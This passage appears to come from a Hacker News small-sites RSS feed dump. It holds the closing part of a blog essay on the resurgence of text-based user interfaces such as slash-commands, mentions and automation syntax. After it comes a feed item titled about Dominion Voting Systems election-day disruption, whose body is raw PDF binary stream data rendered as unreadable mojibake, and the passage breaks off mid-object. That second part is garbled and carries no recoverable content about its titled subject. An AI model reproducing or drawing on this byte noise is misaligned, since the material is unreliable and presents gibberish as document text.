<p>The poster child of textual user interfaces is the command line in the terminal. But I think a new crop of tools, combined with a more tech-savvy market, is staging the rebirth of text as a user interface. Textual interfaces are everywhere in the modern workplace. Slash-commands in Slack and Discord and Notion, hash-tags for channels and tagging, special syntax for searching and querying data across applications, @-mentions in social media and team work environments, and so on. We’re training ourselves to be more savvy users of the <em>textual interface</em>.</p>
<p>
<img src="https://thesephist.com/img/text-interface.jpg" alt="Text as an interface">
</p>
<h2 id="the-forces-at-work">The forces at work</h2>
<p>I think we’re seeing textual interfaces rise in popularity wherever people look for any of the following.</p>
<h3 id="progressive-feature-discovery">Progressive feature discovery</h3>
<p>Text interfaces within graphical UIs gained popularity in places with a high feature-to-visual-complexity budget. In other words, when there’s many more features than can fit comfortably on the screen at once, we hide that surplus complexity behind text options.</p>
<p>In many tools with a high degree of hidden complexity, the average user uses only a small subset of those features frequently. A Slack workspace, for example, might have a hundred slash-commands enabled, but each individual team member may only frequently use 5-10 of those commands on a regular basis. Rather than clutter up the interface with a hundred buttons or a web of dropdown menus, we hide the complexity behind text options, and the user can learn the few features they use most frequently, so they can access them again easily.</p>
<p>This idea applies to tools with a lot of complexity, where any single user might only take advantage of a small subset of that feature set. I think more tools are falling into this bucket as productivity tools consolidate. If a single kind of interface is shared by all business-chat clients, or all product-management tools, or version control software – rather than building custom interfaces for each workflow or use case, why not provide a wide surface area of functionality that’s accessible via text?</p>
<h3 id="extensibility-and-the-portable-interface">Extensibility and the portable interface</h3>
<p>Modern software workflows cross application and service boundaries all the time. Textual interfaces provide an enforceable, rigorous contract between services and applications that can act as the interfaces for apps to integrate with external services, in a way that visual interfaces can’t.</p>
<p>In a software development team, a proposal for a bug fix might flow through a task tracker, which connects with a team messaging app, where an engineer might run a group poll or lead a discussion. The request change might flow back into the task tracker, into a version control system like GitHub, and then deploy automatically to production servers.</p>
<p>Workflows like this require that apps from completely different vendors and domains are able to communicate with each other. More importantly, it requires that the interfaces we use to control these tools be <em>portable</em>. A portable interface carries the same kind of UI across different services, so the user can interact with any service similarly across all of its integrations. Portability means that we can enter data into our task tracker through our chat client, or request the rollout of a change through an infrastructure provider from our version control system.</p>
<p>These integration points are much easier to build, and easier to master as end users, when they all share the same, portable format – text.</p>
<h3 id="automation">Automation</h3>
<p>Textual interfaces make automation trivial, and automation tools much easier to build.</p>
<p>More people are using tools like <a href="https://zapier.com/">Zapier</a> and <a href="https://runalloy.com/">Alloy</a> to automate common business tasks or link very domain-specific workflows together across services. Having a shared portable interface across these apps, and a syntax format that can serve as a contract for how to use that interface, makes it possible for these automation points to communicate to dozens of other services easily. It also minimizes the possibility that a future update to the UI might break an automated workflow.</p>
<p>Text interfaces are much easier for machines to use. And as more work is done autonomously by the workflows we teach machines to perform, text interfaces are starting to matter just as much as human ones.</p>
<h3 id="sharability">Sharability</h3>
<p>People naturally want to document their workflows to remember, share, and iterate upon as a team. To share a graphical workflow, I’d need to record my screen or spend time writing down instructions for how to navigate a visual interface, clicking the right buttons and checking the right boxes. Reifying workflows as text makes this much easier – I can just encode a workflow into a few lines of text input.</p>
<p>In this way, workflows driven by text interfaces are easier to share, document, and iterate over time within a team. Text interfaces make workflows more concrete.</p>
<h2 id="workflows-not-data-are-the-subject-of-innovation">Workflows, not data, are the subject of innovation</h2>
<p>Given these benefits of text as an interface, weighted against the very real cost – text is a more esoteric way to use a computer – why are we seeing a resurgence in this trend now?</p>
<p>I think the easiest factor we can identify is that more people entering the workforce are unafraid of textual interfaces, because they’ve been typing and messaging and tagging their friends online all their life. They already interact with computers via text.</p>
<p>But the second reason that’s driving the industry to text is that <strong>the focus of software services has shifted from manipulating <em>data</em> to manipulating <em>workflows</em>.</strong> We’ve learned how to store and sift through data in our computers as a society, so we’re moving up a step of abstraction, to storing and sharing the how’s of our work, not just the what’s.</p>
<p>Workflows, not data, are the subject of product innovation now. And the subject is easier to study, to compare, to share and extend, when it’s concrete and durable, not an organic, ephemeral series of actions.</p>
<p>I think as long as we’re innovating on <em>how</em> we work, and how the services we use can work together more effectively, text as an interface is here to stay. And why not? The software industry has spent the last half-century building tools to help us wrangle with text, and we can rediscover those tools and ideas again.</p>
<p>We’re entering a renaissance of user interfaces, not in the sense of a novel paradigm shift, but in the sense of a rediscovery of classic, enduring ideas on which we can build better tools and systems. And I, for one, welcome it.</p>

        <hr>
        <p>
            If you enjoyed this piece, you might also enjoy
            
            my next post,
            <a href="https://thesephist.com/posts/language/"><em>In defense of natural language</em></a>.
            
        </p>
        <p>
            I share new posts like this on my <a href="https://thesephist.com/#newsletter">newsletter.</a>
            If you liked this post, you should consider joining the list.
        </p>
        <p>Have a comment or response? You can <a href="https://thesephist.com/#contact">email me.</a></p>
    </article></div>]]>
            </description>
            <link>https://thesephist.com/posts/text/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077768</guid>
            <pubDate>Fri, 13 Nov 2020 01:29:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Disruption on Election Day (2019)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077762">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019 | <a href="https://web.archive.org/web/*/https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>Ä]&gt;Æê}wû(Xÿ'é€eHKŒ�â<sŒx‚zc)v:&È\´;{âdÉç)jq(f"¯”Èƒã³†ä1¤ˆÏyôç°òˆ8l9Ù&»�_ÿœããÂ²^žòÞåÑçeœôcnø£¤˜†w%nõiºd\Ÿ�ç;¬€o6:Ê]- êÏ="">}’�¢)Žž÷DÿB.|¬“;wAž½ž¼;ãä•âQaØ¢»+Ê^Ó(Ùä°Lèó¢ä{™Ã—ÐRlúB&amp;°P¬0n&lt;“wÀðj¢Ô°CÄIï:;&nbsp;tÝD;'zÞ#J6m†(ë‘qµ±ïêƒÂì�¿�†!QaÊïÑ†ýúŸ*NÚ5
endstream
endobj
275 0 obj
&lt;&gt;stream
hÞÄTM�Ó0ý+&gt;Â%¶ã¯dµªh�+-jŠz¨zÈ¦�¶ë¬WˆÏŒãxCa‚‡W{¦3ož=ÎpEáš¨œpCxÎ9á¬Z^.JE®¯iE?¯o¯ëîäû+ßµÍ©uoü±½?�ÛÇþl}ÝÙ!kê×‹ä¬ê¡½é­§K×Õ§�úÞ6ý¡³_è¶³K;tÉ¾éÜàßkGÅŒwíÐ¸îÉ÷Žp	òÖô®Ž¹R´:ßûoO-Ý¸s»	ü	¥¶ÝÁ‡�QŒüOä¦J¥t@Q”Dk¸â’!Äð©BŽ±`OySÎï�â�#üœqŠ!LžÚk í�ÈXð�  Ä‚?äÅ¸”÷¥”‰ý“„ÔeàÂÃ$¡Pc.8íQÿÇµ˜çDÆžó`obÎ!àõ¸â5ÖÃ5ðGÎfB’O‘LÁ#á:¥#R¿"õœ8£�""íÔÕŸº¦YÒ`”7QŠ�&gt;ß£DnY&gt;WG.qÂüàZÅÊ<ejÒ‚èÔÙæ�Ìc÷§q kæ1ów_ÆkÏ?…ù«¸|ÎôÀÅü²ÆÄËØ="">Œ¡¿]Kœ…8wVU`¨Æ³êÝ¡utKØb�ƒ8¶§è-]·�ßé23Š”Efr
'&amp;Ã±ÊE&amp;ŒÚÓÊ»sã?Õ®µžÈ4Éî:û0–XZÛûIƒú'
RðŒ•Å¤A*“©/4ˆ—5|`¤bÒ
endstream
endobj
276 0 obj
&lt;&gt;stream
hÞ,ŽM‚@†ÿÊë 3ëW
"h!uÈCJâa‘EÖÖ=ä¿¯¶N3ó&lt;ÃÌË&lt; `&gt;°ú°è[Ú$ÁlíÄd€‘OxäËYÈ~0p`!žÄO9ž`¡x¿‚çb1O&amp;ÏçWã„a`¸Dd´Ö|”jÛeZrµ·¤ä£@;_k*£…é,g=reÑã÷Ø'Â‹áJvÙÔ+„•ã¢ëmvõLËÅÌŸÿ¼‹Óô-ÀøDFï
endstream
endobj
277 0 obj
&lt;&gt;stream
hÞ¼X]oÛ6õOáãú0‹—ßŠq×b]Û$HÒ'Ïª«&amp;^]ÉPå­ùóÛÅ+ÇKÛX°±¯Iž{x¿x)ÅX!…q‚¤Æã/
DtJ˜(ˆ"	+iÒÂdÂ*AŽŒ°2Xa� o½°VP�XYpR`Š¢„^€4À�/† °¤¤–Â¤W[)ŸÓ�PrF(%I8	[œƒŒV8/”ÖÈ€õ(”QFxð,zðY’”ÊÂ8&gt;�ðàs:
&gt;0Ÿ×XŸOëà0ž«ûø¢R[¨ˆ ðEÄ!h¡¥6"H�ÀuM¼ƒ„SÁ­$ô$ü
“Q
­U&nbsp;ÐFF%´!+"ø‚Ág'¸¨m{H€"øœv!×FEðyøK„Q 	�@°«)Þ&nbsp;ÑÓ)›:š4Ö6’N©“²,CÒ
Â�J3È¹‚9OŸ¯æ¨).Y›%Â¹(.Ê¶ª»ë¶ªR�`joæ¬úÒ½ªîÀT\6ëêM¹IE”0×w›ª¸êÚí²^6MwrÒïƒýz~ÙSz‘w�Ùˆè³`Hd
É’X*–£aÉHöHf¶�ÕBÖ
Y)d��UBÖ¬�·yû˜w�™%f›lV°YÁf—\Vp¬�7rywÏÈÌâ³-.“¹Læ2Äg=Ÿ9}æôÌ™õ¼æ„	Óƒ‹«âªZæ°Ÿm?}žËt´ûˆ¤³�~¨t¸Ó�NwúÑïžtNv¨Ï2°dv�ØCb‰�#Çùpœv“ØAb‰]$vŽØ;b÷È3Ç‡¼}0f^ï÷Ç·CúÝZ˜Ç-‹%ïÆuA\Ä•A\ÄµA\ÄÕA\ÄõA\ ÄBC½s¡W:q©×:q±W»âjW\íÃ¸Þ®×ý×"k‹&gt;Å§uÝte·jêâjSÖÅiÛ­&gt;”Ë®¸(f«wëUsÓ–›Û»4x^wí]ñì¶l»âÅêfÛVÅO«ëŸvÃ¶Ù&lt;+7ÃðyýäUq–¾^à,ß�^ÖëU]]Ý–8ïŒ&gt;ßvi.›�°úX5ÛŽ‡ÛwŸ—íj³nªvâeÖ|IÖoë÷U»c:9ZÇÿ×2¸I-æÿAïXÌÿmó°ßj%»º|ìî'ò¬}s�t›oµ™^kèû-gh\ù´-ú.ð}þî7”óýup&gt;ûåòädQ¼.ë›žŸýøöê	šUv£¸¸š»ÖëUý‘/µã	yÌ#<l¶Šµò­·¯uÁ*~ˆóx!"Ö ¥Ñ¤j<©mjf#íh¤;Âûc"õÐ«Ü¹ÿ‘éyóþn€ûðü="" ó="¸’ãqDÎÔxèø¤©ñYSãÓ¦Üh¨¬S‘/Ü¤CßÄ" ×Ó�w\†ÏpcÌ="M}zóˆSß¿˜izÏ�Såp`Ïaç]ºt.Öå²ú„ÇÕb¶n–ïÕ]œZ‹kA99" éÕÃ¨)^="" mµ3^q7mÅ‡šzÉ}ƒŸ+v�Ïƒ3€="" Êæ{Ê�4z�="" :ˆÜ="" 5št�fšÑh;éÆ»äg“†ÑÈ8="">ör¼¥D£ia%3ðÒáüßƒÕá
Ø�GÔÀWXsÖ�uG`ý˜@èÃÕðq&lt;Kò+ˆŽ¡VGQ“&gt;Ÿ¿Óþ¿iætÝýðç_“å¤™¬ñÙNÚ‰˜ü&gt;© ?OV˜©1n&amp;ðÝMn1/&amp;×ÿ±7Íó30lû_oz¦%8j0‰ÉkÌÝàóký$Ùj¿c_~éØ»ÔT¢ÅÒTá!ï®S‹X7õR?ÖÕÿ`üg]Ç
endstream
endobj
278 0 obj
&lt;&gt;stream
hÞ„•?oAÅ¿ŠK¨v&lt;ÿlKÑT å”¤‹Ò€¢�
ßžçY]Nä\ygýæ7ž·g�A…xLbmˆB•ñ&lt;”êèˆFU…xjºÉÔt³RSèf£Î†Ø©�Š8¨ë@œ4X…Æz¯4–Þh:G
MçÓTè¤’Tè¤‘x-ÒIÌuƒ´ùz’1#
jdÁžÒ|¯
…º¢V,ªA£H·Vö‹5TÊŠt3¿*Jì+…E_)lè+ò¨&nbsp;ª¹-`xÃSÆ~a¬Ìoäg™[aØa~—†•
/°Å*Ø±Jixí:ßnT‹/,^:uuµ}zð�Qèv}Œ=jDÛ#&gt;Æ9b�Ø"öˆ#bðfðfðfð$x&lt;	žO‚'‹ó¸ñ­ýi»Ûîž¾þ&gt;¼l*xÏcOŸq§šcø-Á5o÷ïÞ‡ªf˜–	z&amp;™`fÉš	,u+÷“SEj&amp;§nrj'§~rj(gŽ&gt;ø4‘ý]Ëcª6„›/ß‘’sÕýŸ_OÛÍ‡�·‡Ãâì?ï×œÏß~þTÝÇÎ:¸¥×úr°¦Ï‹ûl[}§ÑŸý©ÑŸý©ÑŸý®Ñïý®Ñï&lt;žÏ‚gÁ³àYð,x&lt;žY|Ž’Î91Ãþ7.	j&amp;h™&nbsp;g‚ñ–àšOgÂ%„dÍ–:•{™šÉ©›œÚÉ=µ‹G
IåÔRÖ¼K%5³Õg€ÿGŸÌ€‹ê—À|®:›Ñ;¯9ûø+ÀWBR
endstream
endobj
279 0 obj
&lt;&gt;stream
hÞl�AoÂ0…ÿŠ�›ÄhâU£H©¢ëibhL»‡Ê°HmŒÃÆ¿_š"@'ûùù‹ü‚
Aªg@]Äš
f³¬|™Dë#[ðÁ	`V[$­öÓ7“DžÄÊxêwTRŸVZz¨Ëz¬§c¥s¨¸³Î²ƒ/ëv°&gt;¡.À‚ýž½‘ÞzZÒ.ºƒà-¼¶Ô¤~Mþh
PÁ–Û–ÒÃ*üa?PîJUæ4‚÷FxCGñ6]&lt;ÎççdÓtè’~ïdÀ›¥ˆi¾»ÞÐWº¸¬&lt;/¿ó�ÆHÿ	0™žkÍ
endstream
endobj
280 0 obj
&lt;&gt;stream
hÞÄ”ßNÂ0Æ_¥O`{úgl	Y¢(Ä#a»0!\ŒÙ�®d+	¾½§keh6À¼`§ëùÚ�ï—s�„ Br"ˆŠáL‘˜Æ„Œ€ŒÇtb*«+Û,b”/0‘øÈYˆ"Q„(CT.®è¤6›³[²+&lt;ˆ¿8&gt;G	&gt;WôA?¿ƒÙyQc
øéö“t¡³­KÝ´õ½›:Û¥v/m¸\·µ¤)½ÛÙYfëT³V%CfŠq3ÏÝfÔÍsw4kN@² ~z\¿éÒéï?œ&gt;ìcfaÜí„ÑÌÖÛÒúŠ|Ï‹uC3šn4úxÑiz@•„Z/Šæ�¦‡ÍA¿¹ëª2.+¼·o«ò¬þê‚ómãZˆNàG	pýDÀe|I\Á�†F�G^5kU}"“•b*=Šçµ)3m—t~;¥¹ÞYd1YÌ†‡›Üðpu²¿ÔqºAGÔEéBÜÑ•jˆ®]Ù÷§#yG7ˆ}#Ê®÷×ŸMÚ÷®'
£S¤ãÒ_í@£*
endstream
endobj
281 0 obj
&lt;&gt;stream
hÞ¤‘ÏjÃ0Æ_EO [JdYPíiƒFSØ!ä°u9”A:‚{ØÛOn…B/&gt;|þlýùYæ˜ Ç¤.
$L~”“«ïM`¨¶ç8×qµ
kà$Õ„Mï¶÷µûùžÂæ¸|NKxƒØuW3D�‹cx
Ïa;íË�U€X�˜½hÂœ
¨ÉHÂcèËrÚ—×÷ešhèO¥V~9Ì_—ëy&gt;–®»R¤?R°zc&nbsp;Ôb}icµÊ‚ÜÒFzŒ1ÔäÛTZý×TÔ0«
Çˆ¢
£�ÉŽ=Æù`çi
endstream
endobj
282 0 obj
&lt;&gt;stream
hÞìYYO1þ+~¯ÐúöZBH&nbsp;‚ŠSTT}XÈ¶¬
”l+ñï;ãµ�B
i+¨dE_s­ÇþÆ²™â„¦$aL•P„qÃ¡Â%t+J¸’Ð--áV*Â™ ’Qh1maHÉOI”¤ *
QŠ)¨(¢47P‘D
�ÏX´#9±Œ²¾^ªi=·]±9iª›â}{55í·â¼i7ÛiÛÃf2í¶®«	¡òo×Ó«Is×�'„s_r\ìWžƒ+Uœü¸ìîïêâtò£&gt;uüs–Î›Qw=ýlàû^“¸)	¥´£²´Dk˜3Ëˆ¢'èSÇí d~G‘tD‚~F!JhÉpîÈµ#°í)uýÎApÀñB¿“ó|QÎ×-ÝëÆþà’„…ƒºðc¢£`#u8ÖÑ Ç²Le&lt;9=”&gt;ÈAÝx™@BÀê¾Ä	ª·‡¥Óïõ0š8;ð+bEð“°âH1^^uÏuúNŒãðjCTEMÓèƒ`Þx¿Ðyß§`KÔ
4ZG]ø„™éZùÊHø1HsäœŽ‘M(�$÷Ñ+bžÐY“ò¤«Ì¯Œ§–-n…tUÌ/çgm˜˜…6‚^J¿ll¤(´³{~üñü�£ƒÓQ¦nGUÛáèñÐAM„¥½QÝvMw¿¶û€8ðG‹ÓñYÛS�häd"ÍZlí�{‹ìéì™eöÂ§­‚´Lf&nbsp;Í@›�6ííáÑ§ý�³w;ãîººŒÇßŸH‚?:ûI:IŒÙ�ôŽšÎ‚c)Aq`Ñ�Kåkö±€³²²6×â±Œ±¾,ñ�­Šƒ&amp;Ëüx©KüWž‹¢¥¯«Å^(ƒ€{Ê°¾´°\t“¹½(-à5Ó&nbsp;QûQI‘ð€J7¢J°/ÃÚ`|3Z5;û¿¦Ü¸ÒÈ™=áPY”-=DÐHÒîkÔâ};Ÿ@‡ƒþU³Cð;ú‘d‡°C‰ý¸’¬pÁ¥O?ÈÍO"çüMç�xxIã\Îd‡$«¬’‚‹!,Î^ß³³Cù‡Ù!	ü²ì0¿½�ì°ä°h~5¤²Ã£þ‡Õ6‡EÕÝ×m€›Ëª›«Ûz¶/gŽ¼ì©în}ó³îš«*‚8Ø£¾Ó„ãÏÓ”¯$òI9Ÿ”óIùuOÊÃ£ƒáÓW\¼üŠ€ËeW'›Ã“­O]Iúr{‚ýöJbm¯«nš«Ïžüÿ={fÀÍ€›÷
n¾!Í0”a(ÃÐ[€¡|—ïãò}\¾�{åû¸÷ZS.}­‘ìï¼Öh&amp;æÞkúWùÕ^lúÿ—¼ØP÷^CW}­�hü`ü­M
endstream
endobj
2 0 obj
&lt;&gt;stream
H‰„WÙnÛH}÷WÔË"`•YÜ5h4`Ç�e€&nbsp;3°Ðypú�E‹™(*Žÿ~ê.µ°$¥CæV·nÝåœsï–W7·ÃØµõj¿ývs;Žõj³nÄãÍr·ßÜÝí~ŠÇ"—‹"eRÈD"Ï3YU¢Ì¹P‰þêáø4¾í×âæãºnÖƒ¸YâÝ—ú¹ëë±Ûõâ÷ßïîß‰«›w±XD,ÄaÕ_Ý,—±PbÙ^Å2Žs±\‰9\éG¯B[žÇúKý¿ÔY&amp;±|¹zœ½‹*1ÛE‰˜½Dÿtð3ŽëH¥b¶Žô�ØE*‘JÌZ-äB¿ÝÐ[ñ5ÊÅl©˜­laí:ú{ùŸ«\ˆqwíÇ.›«™ˆ–ÿ»b¿|“DÆ}ó8{¿Žæz·§h®­
GüWã&amp;Ã[`;•E65�¤|Ÿ™­R»Õ–Ä2Wf§k&lt;^+´¾Œ'2û'¿çéBÌ•Lüêýí{yºkŠA�envU	q‹Uv²a9Ùpnwt�Ò	(�¡/š¹ý³æÄdÂò,?Ù 7äÁG�Óy…Y*ã‚­¤gŒþñÊó4ÁçwŸîõ+.Ù3•‰ñK8~�³%Ñ†ŠSrïŠ³‹”þí±&lt;ñi¯¿€ªÁÔ¨®L|Ý?Gº·fâK¹Æ…#Z}¡…âíGÚb&nbsp;GúÉsT@43~ÖðŽøX|ŠT	‹ðË�Þàz|0j'TÂŽ�“…Ö&gt;Zý•Üc+h&gt;ð�Ÿmíá^ÑvC§¢›^ÜÂë¶uÛ¢‰é™ÿŒÐMü†Ï‚Ù3•”–ÒÖO·ÃÒöÊ~b«úqöùØ;‡élûÚº«_ÁøÐèÖÞØÀC¸òŒ<vˆñä"céhà)þ\g*‡î„ë~Ãp7‚¬÷ ®drr:n‡k¦|="" ª½x7Ôÿ‚[ÿ&pûäeÐy×Ó1¸h¦ÙkîÙnýpÛÖfˆˆý˜ßckwØ�!pqéù¬õx­ý…ÂÆ·õ="" +ž¾¡×Ï4~(zg£lúádŸñáÞÓÂne‰íöôù¶ÃïØ8a4ºgëújëhaÐ¶ž[è9a;ÙlÞõéõ²}Ò¹w1Ç˜ct�~ôº8c`dàñ:ÐØ²k¼=",ÈšÝ%4ó‚}K®q\ÐÙ" ¬xÑ«cpÊ›@d��øŒ·^dôo="" k´åÛq&®!‘x¡Ì6èßÞó›lpÈñxô|û†="" Ó‚):ó="" üp´~|1´÷*²�eh™Œo¹¡˜rÂlx"="" €<–™å·{ê¯k]g�zsu¨mvvˆômg¨¥2×�“6¯Ñù){!¹+%so£Æˆ9$nèÓ[0ÑÎã¢b¦~ypg;Ä«cu‚8Ê»qcŒ„="‹$Ç)ƒã¯ñ" Ë="!" Œ aü¯<ÚbÄÅ¦3Ô_}'k»�¨+§¼zj\ªnr¼àª4äÿ†�="" lÌ\ab8”sÊ1Þuôï€zêk™æïx•�pryð%lg9òüxfs="" žâd}Ä²,oôÆz~l­æpfsÜ-a+'�›ô­e="" <iã¥È…Òâòìåœ6�°ëe,«ÅÄ‹_ï¢{ËŠn�åè&�«o:�pu�(ôc‘›.ÒÉ‰—z“j[dé_j;…vz�û™¾Ó…nÇj‰a}Õrx="" n‘%v‘�bß'Ãc^•2ohzx"�lpw®oe¢¼³¯Ä3yj¥&”Éw¨fË\zŸ‘È&f�ÊÂð€lãÑ§="" tºjå¡c(]bÍ•‹‘ý“gÆsgk,.æ‰[á="" i1)‹ˆ="" ä‚#v„ƒÁžØbÀrftû#ã�5?‹?18»wö@äkŠ²7Âwª˜‘6¬îuò(p%ès¸ì¼½¬¦àš(™ù�jj#æfÔnö¡7ude3£¡�“{"�ýq‹çÂ�yuÒé“�.¬Â‘zp©i¨èpiÔÓäñãìt@.Ýxa8¹cf¢5b0b­íi§Éµ°´äi›³¢ë‚ä¢:5%'½ƒ)’5®ûîdŠ)å"Ô*ïxÕùf="" 2"ù="" ùkm›b�="">XV£<q.¼Ñˆt0ü‰µ#®@n“ ‹�{nhs() ÎÀdú˜á·‚)dmªÃèw="" soxq,o…="" ¦•j‡q8Ç™q””="" ùoûpÑ¶®'’eƒz*s‹½Ó="" þk»ø4a“ºlé<´­­dkí7)é›jƒŠ×Œiü="" #—Ò¯õxa<l:«zœvãôŒf}¸^9åÜo^bý±hmæ"jÄÍ=""  +ÜÃî�-i¨gi3›ÝÌ‹xzøfëaéÆÍŒ<ï‰¿="" Œfàñ¬×®i‘+;Ôm)æy#Ë†Ä�£0"u²Êl¸_‘·[a&¥Îpg2•sjsyù©¥8µ^,|}É™x¼am¾Û¹="9ÏX³°Å¶3sÐ[„ÿÂq£’Y*QeÜQy¨D—$" !’Ém}¾ƒh.Í‰–lfm‡q?ð�4Çt‚ú<òt0Š×šè��æÁ~oßlÑyz£.mtýyc…i2½$¼`ûgú‡¨ñä5d¯`«vÐs®g¸$oí="">àôà†Ç›ÃT‘T`*tÇ$&lt;5Q"|×Â3�Œ&lt;+ÈêKþÀ}.¶X?€ov#:Õäáõ3ŸƒÏáø&gt;]Q­ŒsxýDÝc)†-I¯©}’ß«J|›�
o“k¨Ú¸À›BàÂ-îŒ—+â;ß
¢Óß"x~2àêþ:<qœzq|Žañ<±q"æòÁm�7Ž¤z‹a,j�†ú‘¢³$fÀgÓšqÐa—p€ËdæÄ¾yq¼q3�´~ayhÅcò“ÍhØ°ç½†@r€0³(cÂµÛ†kŸsàj£Á`û#›²úÌ8Äqe3‚_�Ïû,ab‚'Ìp‡§0®0 ( ”ô¦¶„ägÀh="" ›Â‰êôÁô¢ptºñ[’$qnmû7mÇ14´â½öÄ¤›¨j™å~Ÿ)t3]&i‚ Ý)©="">7_
žRrÊÈf,Y{OsÇÈÃF¡à&lt;™\”áy‚ásžj)ýX¿@ç¯ø}Fþíq]A€ßàç"Kf²´üö„Þw<p �…“ÈÌn§�kî­í="¬ækÜyÚÔ†~}Ù1Hà¢ýb1ÁS-†¯©CxžsñÄH·<Ïð­×ËÍ‘àÁŸ‘NdTë\0�ùô)�­Ô»6Ð‰¡JZ" Ùš°jŽÔ¤="" ™ÉÞ!¢b�ìm0="">^
Jc±$µÜQ¿ò\ƒû
î€DxQ—2·©¬7ñÔêT�°žg/²¦	R™¥4Sý Ñ‡xý«]zê�"
ôÕÂBÑjg¸›¾‚ë€°d\„	Ô�'süvß“Dª)N�'�lv
Rõ¥1+Å%yœ}´èñêê1@*ú)~£æ¤`œ)GU�SõÍŽ9ÝN½ƒž.šMœp²x®²*ü²³&gt;�,sÃ…‡nÔUàŠVÉn8o£�½È&gt;JZÊ##CÀiø
›¶IŸcêtûUöæÁÅ¯·&lt;�u:0}ÃjÞÐIkµ’ªŒÃGä¥ƒ3�(§0�¢÷ãïf%&lt;Îªxõ´uGo=Zž&lt;6±—êrô§è;§ yÙÜã	16ZàUánH&amp;sÕîæÓ–*
›:X×ôOÐÜ¤¶©§N:sq‘ˆ•!bÛë“³’Èaq7?á,¤q8µ½ÓPÝöb"ÍR\‰íäÔ&nbsp;h(‹o!Ó&amp;g˜6µ%$Á�†·
þ	ÿõŽ%’¤:ç§Éˆ›
^ãQP¼ÒX@`¹ÝRyéw‚‡È�@ÅŽ—°À˜h#Œ@—v=B§ôÏ"&gt;—E9å%«u[(+UH–$z�æeáŽÂÁªo€Á@¿cº¿ÿ�_J–P0sßÝê»J|€ßÁíqÏe!Øƒ–¤Åèùˆ×­N¹Œ&gt;w“fÖØ¡|IlP– °o;
/N,Nàðÿ¤WMsãD½çWLµªÂŠ&gt;m‰ÚÚ*’x!‡�›[NŽmŠc™~==ýzfZ’m&nbsp;¸$–4ÓÓÓï½6A°š&amp;Ô©CO@Ü~ìÉñá”C¥ÒEc(—9›*¿LÉöÃ;%rÌUà%´´}�®¤‘DôK°°çÀ
f?Ýå;÷7Üu=˜­d6ê&nbsp;Š}¨G´Ú)@Óé9Pñ6[dóŽrTÒcèÑxBÝ9¯ýr&lt;Ñ¹8&lt;0pî ›F
ÀôiYÌ´bjý¨’…(ùÚ
Ä'U-l:ŸÊBƒàüæÒœ�ß™÷ïÏo.¯¯La&gt;|¸¸¢wc,›`ó$ó÷ÿZ4öJ
€g±{Š¨-
Ãà
e²&lt;}Îõ”®­ÖK\tÏK±aÉõ*0)ºu»K~õUÜ³ü¼=ÖD­ê
Ç:DWJ]rß={”‰ûâ¶ÊW~¦êzå¢Î‹ËÚ­i°ä&nbsp;8t³Š9‡|2ŠœšY|¥_é&gt;?2µ„&lt;&nbsp;,Ÿ]s¹¶¼ouHÊÏÀ%$£!Or(YÃS^ÐJœ¹%·‘×øOÔ¼µÅŽ#âœ¾*q®öœÄu~ª€ËLyªuý^Û¢tÌ¼üIq®®kFFž×2N„íÙc¥UÆ…'ý1ÆYüoÐBR7¥È&nbsp; T©dŒ©0§{Æa€ç7h
ä1&gt;wŠ3±—ªíÂ›G­¸ì^Êw9.ô?É&nbsp;…:€è–wow^¯gái
µÆ÷ÓÊ7›‘tÔ´q÷&lt;`×ÜÆ
Aá»!,MXÈ¼gWœ÷­˜ËöjºÇ�€®¨^0{ÀJe€º¼qê²_~‰�Ì$x{ëÚÆ+;ÖuôfÑšë¸•Vqþ„D½ÛT�HšÎë©%o}&amp;l´÷
©Ürã
íeqáíÂ[®�eQÄ!ã¯°¹€ÉÝ
sÁØh*¾¼›�æ‚Dæ‚ÂcaØm&amp;µµ¯)ðo#`Šäv¥¥Ã!�†zªcú®êI·]Á,ÅÛ›Ê³O[5^uZä,*Cêi»ó®sMÂ³•žpÅ\zå-…ÆW
ÖÍ:ˆ§ETKÂß=&gt;ìw¾Sz+Óà°’=ä«zù‡ý8¢Ø6Ì�ZZ…«vák«tµÅ¤“—jØ¬PVÇ',WÉäãŠü�ØS(‚(
:üoz¤#L�Gßpf?$¼�f2b4»4koA*F�D€Q�¨n~vþcîénêèî‚Þßß§†bÕxÙ¡&amp;	ªé„Ä[Bñs–™Œú£¦`¾P«Æö²�Á‚&amp;ÜY™i7Â1žº'ž»Ó8­=ùÒ’È¢¢%±A SŒ¸”C!+û¼_-DÝCd�&gt;Sû±†&nbsp;ã5+=-HEòë·h“d)·èÈº¢³ö
&amp;ŒVU\…—rÌç¨´K	{S{š¹sS-»D&lt;@wò)íëæ{º}U¦Æ¼-7g3roJá,âÙÔ3$..¨\wOg
gdÊÌËX&nbsp;&nbsp;&amp;!¨}â°ÆyË8i	¹\Ø¤=¼ûSß³5_±.D&gt;7¸Cç3}ƒñ9Y&lt;õ’øŽ�î`ûåÈ&lt;)œ˜·@ø(œPo»hê~Ë€Ý�0æ­@DbÃŸq”™ÿþ‚ØRÂkíF€�úÔšoÝØÌ­o]Ù-d“´ªÛ	:�óš?"7C`OÛ&gt;ÙÒ©{ãÅÓ°ÿJK'¤fårx@ÃNòt@=·$Ž©¶~‰&amp;,ýqlÊWfš°¯Ç{ÊäÔ&amp;²ïO'õéÒ�ÒÐ{_Ôre/sœ��k^=g-ÚöOF»ŸCÈXønyWÖóÛõ#
IGš¶É3šÝ=h°*NNÆº&gt;kê»äÿÅºü±‰˜ìÀäàD
0wÇ€ÉìÚÂýJÀ¤°Qz§Á¢[»HÔó+ûe×—î,æ¡N˜š÷�QØœb9É×Ô|5‹"û¸CuÁ0g6kš5Ú$uìƒ�#¦"ÄX†±ó(¦n’
Ã‹=cL¼�é.—À€îÈþ!¾ó³é$€æ¾K‹&lt;äüF‰Ù‰#´—MÿíeÎùŠFW ­©½=³Òz'
‰äËÇ—ˆ´¶ôåIL%ÄÕR
9w/À=^#ß„½ºA$ëÀÁe®Þ¼Îÿ‰½Ò¼²¼¢Øë(y‘À?Å^…�M1¦¯”²1ƒæøéü{ö.&nbsp;€cúð·?oŒ�
endstream
endobj
4 0 obj
&lt;&gt;stream
